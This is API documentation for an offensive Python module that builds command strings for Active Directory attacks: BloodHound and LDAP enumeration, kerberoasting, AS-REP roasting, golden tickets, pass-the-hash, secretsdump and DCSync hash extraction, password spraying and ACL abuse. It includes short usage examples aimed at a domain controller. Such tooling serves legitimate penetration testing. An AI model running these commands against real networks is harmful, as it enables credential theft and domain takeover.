# Active Directory API

The `ofx.api.ad` module generates command strings for Active Directory enumeration, Kerberos attacks, and lateral movement via credential abuse.

!!! warning
    All functions return **command strings** — they do not execute anything. Pass the returned strings to a [post runner](#) or run them locally with `subprocess`.

---

## Submodules

| Submodule | Purpose |
|-----------|---------|
| `ad.enum` | BloodHound, LDAP, PowerView, DC/share enumeration |
| `ad.kerberos` | Kerberoasting, AS-REP, pass-the-ticket, golden tickets |
| `ad.execution` | Pass-the-hash, SMB exec, DCSync, password spray |

---

## Enumeration (`ad.enum`)

### `bloodhound_collection_command(method="All", *, domain=None, dc=None) -> str`

Return a `SharpHound.exe` command for BloodHound data collection.

### `ldap_query_command(filter, *, base=None, server=None, attrs="*") -> str`

Return an `ldapsearch` command for a custom LDAP filter.

### `powerview_command(function, *args) -> str`

Build a PowerShell `Import-Module PowerView.ps1; <function> <args>` command.

### `enumerate_dc_command(domain) -> str`

Return an `nltest /dclist` command to list domain controllers.

### `enumerate_shares_command(target) -> str`

Return an `smbclient -L` command to list SMB shares on `target`.

```python
from ofx.api.ad import bloodhound_collection_command, enumerate_shares_command

print(bloodhound_collection_command(method="DCOnly"))
print(enumerate_shares_command("DC01.corp.local"))
```

---

## Kerberos (`ad.kerberos`)

### `kerberoast_command(*, output_file="hashes.txt", domain=None) -> str`

Return a `GetUserSPNs.py` command to request TGS tickets for kerberoastable accounts.

### `asreproast_command(users_file, *, domain, dc_ip, output_file="asrep.txt") -> str`

Return an `GetNPUsers.py` command for AS-REP roasting.

### `pass_the_ticket_command(ccache_file) -> str`

Return a `KRB5CCNAME` export + usage hint string for passing a Kerberos ticket.

### `golden_ticket_command(user, domain, sid, krbtgt_hash, *, dc=None) -> str`

Return a `ticketer.py` command to forge a golden ticket.

### `find_delegation_command(*, domain, dc_ip=None) -> str`

Return a `findDelegation.py` command to enumerate Kerberos delegation settings.

```python
from ofx.api.ad import kerberoast_command, asreproast_command

print(kerberoast_command(domain="corp.local"))
print(asreproast_command("users.txt", domain="corp.local", dc_ip="10.0.0.1"))
```

---

## Execution (`ad.execution`)

### `pass_the_hash_command(target, user, lm_hash, nt_hash, *, cmd="cmd") -> str`

Return a `pth-winexe` or `psexec.py` command for pass-the-hash execution.

### `smb_exec_command(target, user, password, *, cmd="whoami", domain=None) -> str`

Return a `psexec.py` command for remote execution over SMB.

### `secretsdump_command(target, user, password, *, domain=None, dc_ip=None) -> str`

Return an `impacket-secretsdump` command to dump SAM/NTDS hashes.

### `dcsync_command(user, domain, *, dc_ip=None, output_file=None) -> str`

Return a `secretsdump.py` DCSync command to extract a specific user's hash.

### `spray_command(users_file, password, domain, *, dc_ip=None) -> str`

Return a `kerbrute passwordspray` or `crackmapexec` command for password spraying.

### `acl_abuse_commands(target_user, attacker_user, domain) -> list[str]`

Return a sequence of PowerShell + PowerView commands to exploit WriteDACL/GenericAll ACL misconfigurations.

```python
from ofx.api.ad import secretsdump_command, dcsync_command

print(secretsdump_command("10.0.0.1", "Administrator", "P@ssw0rd", domain="corp.local"))
print(dcsync_command("krbtgt", "corp.local", dc_ip="10.0.0.1"))
```

---

## Workflow Snippet

```yaml
jobs:
  ad-enum:
    steps:
      - name: bloodhound collection
        script: |
          from ofx.api.ad import bloodhound_collection_command
          from ofx.api.post.runners.ssh import PostSSH

          runner = PostSSH(
              host="{{ inputs.target }}",
              user="{{ secrets.ad_user }}",
              password="{{ secrets.ad_pass }}"
          )
          cmd = bloodhound_collection_command(domain="{{ inputs.domain }}")
          print(runner.run(cmd))
```

---

## See Also

- [Recon API](recon.md) — Port scanning and OSINT
- [Privesc API](privesc.md) — Privilege escalation
- [Post Runners](#) — Remote execution
